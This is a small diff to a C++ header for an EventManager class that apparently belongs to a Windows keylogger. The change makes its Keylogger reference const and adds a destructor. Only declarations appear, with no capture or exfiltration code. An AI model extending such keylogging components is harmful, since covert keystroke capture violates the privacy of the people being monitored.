@@ -12,10 +12,11 @@
 
 class __declspec(dllexport) 			EventManager {
 public: 
-    EventManager(Keylogger&);
+    EventManager(const Keylogger&);
+	~EventManager();
     void handleEvent(const LPARAM, const WPARAM);
 private: 
-    Keylogger& _keylogger;
+    const Keylogger& _keylogger;
 };
 
 #endif //_EVENTMANAGER_H
